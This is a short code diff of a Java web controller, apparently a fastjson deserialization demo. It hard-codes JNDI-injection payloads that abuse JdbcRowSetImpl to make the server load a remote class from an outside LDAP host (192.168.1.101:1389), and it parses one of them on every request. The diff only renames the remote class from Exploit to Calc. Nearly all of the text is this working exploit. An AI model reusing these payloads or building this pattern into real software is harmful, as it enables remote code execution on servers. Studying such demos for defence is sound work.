@@ -79,7 +79,7 @@ public class WebController {
 	public Object jndiuser(@RequestBody User user)
 	{
 		String payload1 = "{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"ldap://localhost:1389/Exploit\",\"autoCommit\":true}";
-		String payload2 = "{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"ldap://192.168.1.101:1389/Exploit\",\"autoCommit\":true}";
+		String payload2 = "{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"ldap://192.168.1.101:1389/Calc\",\"autoCommit\":true}";
         JSONObject.parse(payload2);
 		return user;
 	}
